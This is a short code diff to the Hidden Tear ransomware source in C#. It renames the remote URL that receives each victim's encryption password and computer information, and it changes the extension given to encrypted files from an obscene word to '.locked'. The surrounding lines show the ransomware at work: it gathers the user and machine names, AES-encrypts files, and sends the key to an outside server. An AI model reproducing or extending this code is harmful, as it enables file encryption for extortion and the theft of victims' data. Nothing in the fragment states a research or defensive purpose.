@@ -55,7 +55,7 @@ namespace hidden_tear
     public partial class Form1 : Form
     {
         //Url to send encryption password and computer info
-        string targetURL = "https://www.example.com/cryptofucker/write.php?info=";
+        string targetURL = "https://www.example.com/hiddentear/write.php?info=";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
@@ -145,7 +145,7 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".fucked");
+            System.IO.File.Move(file, file+".locked");
 
             
             
